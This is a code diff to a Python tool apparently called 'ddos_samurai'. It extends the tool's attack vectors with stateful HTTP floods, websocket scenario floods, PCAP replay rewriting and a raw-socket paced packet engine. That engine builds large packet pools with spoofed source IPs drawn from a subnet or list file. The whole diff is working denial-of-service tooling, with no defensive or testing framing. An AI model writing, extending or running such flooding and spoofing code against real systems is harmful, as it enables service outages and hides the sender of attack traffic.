@@ -10,6 +10,7 @@ from datetime import datetime
 from ddos_samurai import packet
 from ddos_samurai import senders
 from ddos_samurai import stealth
+from ddos_samurai import cpu_packet_engine
 
 
 from ddos_samurai import utils
@@ -1754,17 +1755,37 @@ async def worker_process(
 
         elif args['attack_vector'] == "http":
             verify_ssl = (str(args['http_verify']).lower() != "false")
-            worker_stats = _add_stats(worker_stats, await senders.http_app_sender(
-                args['target'], args['port'], args['count'], args['http_concurrency'],
-                args['http_method'], args['http_path'], args['payloads'], args['verbose'],
-                scheme=args['http_scheme'], verify=verify_ssl, timeout_s=args['http_timeout'], retries=args['http_retries'],
-                ssl_context=ssl_context,
-                cookies=args.get('cookies'),
-                user_agent=args.get('user_agent'),
-                live_sent=sent_total,
-                live_errors=errors_total,
-                live_progress=progress
-            ))
+            if bool(args.get('stateful', False)):
+                worker_stats = _add_stats(worker_stats, await senders.http_stateful_sender(
+                    args['target'], args['port'],
+                    args['count'], args['http_concurrency'],
+                    workflow_steps=None,
+                    verbose=args['verbose'],
+                    scheme=args['http_scheme'],
+                    verify=verify_ssl,
+                    timeout_s=args['http_timeout'],
+                    ssl_context=ssl_context,
+                    user_agent=args.get('user_agent'),
+                    retries=args.get('http_retries', 0),
+                    http_method=args.get('http_method', 'GET'),
+                    http_path=args.get('http_path', ['/']),
+                    payloads=args.get('payloads', []),
+                    live_sent=sent_total,
+                    live_errors=errors_total,
+                    live_progress=progress,
+                ))
+            else:
+                worker_stats = _add_stats(worker_stats, await senders.http_app_sender(
+                    args['target'], args['port'], args['count'], args['http_concurrency'],
+                    args['http_method'], args['http_path'], args['payloads'], args['verbose'],
+                    scheme=args['http_scheme'], verify=verify_ssl, timeout_s=args['http_timeout'], retries=args['http_retries'],
+                    ssl_context=ssl_context,
+                    cookies=args.get('cookies'),
+                    user_agent=args.get('user_agent'),
+                    live_sent=sent_total,
+                    live_errors=errors_total,
+                    live_progress=progress
+                ))
         elif args['attack_vector'] == "http2":
             worker_stats = _add_stats(worker_stats, await senders.http2_sender(
                 target_ip=args['target'],
@@ -1779,25 +1800,45 @@ async def worker_process(
                 user_agent=args.get('user_agent'),
                 ssl_context=ssl_context,
                 h2_profile_name=args.get("h2_profile", args.get("ja3_profile", "none")),
+                h2_transport_name=args.get("h2_transport", "auto"),
                 live_sent=sent_total,
                 live_errors=errors_total,
                 live_progress=progress
             ))
 
         elif args['attack_vector'] == "websocket":
-            worker_stats = _add_stats(worker_stats, await senders.websocket_sender(
-                target_ip=args['target'],
-                target_port=args['port'],
-                count=args['count'],
-                concurrency=args['ws_concurrency'],
-                ws_path=args['ws_path'],
-                ws_message=args['ws_message'],
-                verbose=args['verbose'],
-                ssl_context=ssl_context,
-                live_sent=sent_total,
-                live_errors=errors_total,
-                live_progress=progress
-            ))
+            if bool(args.get("ws_scenario", False)):
+                worker_stats = _add_stats(worker_stats, await senders.websocket_scenario_sender(
+                    target_ip=args['target'],
+                    target_port=args['port'],
+                    count=args['count'],
+                    concurrency=args['ws_concurrency'],
+                    ws_path=args['ws_path'],
+                    verbose=args['verbose'],
+                    auth_message=args.get("ws_auth_message", ""),
+                    subscribe_messages=args.get("ws_subscribe_message"),
+                    ping_message=args.get("ws_message", "ping"),
+                    ping_count=args.get("ws_ping_count", 1),
+                    await_response=bool(args.get("ws_await_response", False)),
+                    ssl_context=ssl_context,
+                    live_sent=sent_total,
+                    live_errors=errors_total,
+                    live_progress=progress,
+                ))
+            else:
+                worker_stats = _add_stats(worker_stats, await senders.websocket_sender(
+                    target_ip=args['target'],
+                    target_port=args['port'],
+                    count=args['count'],
+                    concurrency=args['ws_concurrency'],
+                    ws_path=args['ws_path'],
+                    ws_message=args['ws_message'],
+                    verbose=args['verbose'],
+                    ssl_context=ssl_context,
+                    live_sent=sent_total,
+                    live_errors=errors_total,
+                    live_progress=progress
+                ))
 
         elif args['attack_vector'] == "quic":
             # QUIC uses UDP
@@ -1859,10 +1900,12 @@ async def worker_process(
                 src_ip_override=args.get('pcap_src_ip_override'),
                 src_port_override=args.get('pcap_src_port_override'),
                 filter_cfg=pcap_filter,
+                use_l2=bool(args.get('pcap_use_l2', False)),
                 strip_ethernet=bool(args.get('pcap_strip_eth', False)),
                 verbose=bool(args.get('verbose', False)),
                 batch_size=int(args.get('pcap_batch_size', 512) or 512),
                 max_packets=int(args.get('pcap_max_packets', 0) or 0),
+                flow_aware_rewrite=not bool(args.get('pcap_no_flow_aware', False)),
             )
 
             log_info(f"[Worker {worker_id}] PCAP Replay başlatılıyor: {replay_cfg.pcap_file}")
@@ -1914,18 +1957,96 @@ async def worker_process(
                 dns_edns=args['dns_edns'],
                 dns_recursive=not args['dns_nord']
             )
-            worker_stats = _add_stats(worker_stats, await senders.packet_sender(
-                packet_config=p_config,
-                count=args['count'],
-                delay=args['delay'],
-                rps=args['rps'],
-                jitter=args['jitter'],
-                ramp=args['ramp'],
-                verbose=args['verbose'],
-                live_sent=sent_total,
-                live_errors=errors_total,
-                live_progress=progress
-            ))
+            packet_sender_kwargs = {
+                "packet_config": p_config,
+                "count": args['count'],
+                "delay": args['delay'],
+                "rps": args['rps'],
+                "jitter": args['jitter'],
+                "ramp": args['ramp'],
+                "verbose": args['verbose'],
+                "live_sent": sent_total,
+                "live_errors": errors_total,
+                "live_progress": progress,
+            }
+
+            use_cpu_c_pacing = (
+                pacing_cfg.pacing_mode != PacingMode.NONE
+                and PACING_ENGINE_AVAILABLE
+                and not bool(args.get("fragment", False))
+            )
+
+            if use_cpu_c_pacing:
+                try:
+                    engine_spoof_opts = cpu_packet_engine.SpoofingOptions(
+                        mode=args['spoof_mode'],
+                        subnet=args['spoof_subnet'],
+                        list_file=args['spoof_list_file'],
+                    )
+                    engine_cfg = cpu_packet_engine.PacketConfig(
+                        target_ip=args['target'],
+                        target_port=args['port'],
+                        protocol=args['protocol'],
+                        spoof=args['spoof'],
+                        spoof_opts=engine_spoof_opts,
+                        payload=args['payloads'][0] if args['payloads'] else None,
+                        tcp_flags=args['tcp_flags'],
+                        ttl=args['ttl'],
+                        tos=args['tos'],
+                        window=args['window'],
+                        fragment_enabled=False,
+                        pad_size=args['pad'],
+                        attack_vector=args['attack_vector'],
+                        dns_name=args['dns_name'],
+                        dns_qtype=args['dns_qtype'],
+                        dns_edns=args['dns_edns'],
+                        dns_recursive=not args['dns_nord'],
+                    )
+
+                    cpu_pacing_batch = max(
+                        1,
+                        int(args.get("cpu_pacing_batch", 65536) or 65536),
+                    )
+                    remaining = int(args['count'] or 0)
+
+                    while remaining > 0:
+                        batch_count = min(remaining, cpu_pacing_batch)
+                        packets_buffer, packet_size = cpu_packet_engine.generate_packet_pool(
+                            engine_cfg,
+                            batch_count,
+                            uniform_size=True,
+                            low_peak_memory=True,
+                        )
+                        expected_bytes = int(packet_size) * int(batch_count)
+                        if packet_size <= 0 or len(packets_buffer) < expected_bytes:
+                            raise RuntimeError(
+                                f"invalid packet pool size={packet_size} bytes={len(packets_buffer)} count={batch_count}"
+                            )
+
+                        worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
+                            packets_buffer=packets_buffer,
+                            target_ip=args['target'],
+                            target_port=args['port'],
+                            count=batch_count,
+                            verbose=args['verbose'],
+                            pacing_config=pacing_cfg,
+                            live_sent=sent_total,
+                            live_errors=errors_total,
+                            live_progress=progress,
+                        ))
+                        remaining -= batch_count
+                        await asyncio.sleep(0)
+                except Exception as e:
+                    log_warning(
+                        f"[Worker {worker_id}] CPU paced sender pool path failed ({e}); packet_sender fallback."
+                    )
+                    worker_stats = _add_stats(worker_stats, await senders.packet_sender(**packet_sender_kwargs))
+            else:
+                if pacing_cfg.pacing_mode != PacingMode.NONE and bool(args.get("fragment", False)):
+                    log_warning(
+                        f"[Worker {worker_id}] Fragmentation with C pacing not supported on CPU path; packet_sender fallback."
+                    )
+                worker_stats = _add_stats(worker_stats, await senders.packet_sender(**packet_sender_kwargs))
     except KeyboardInterrupt:
         worker_status = "interrupted"
     except Exception as e:
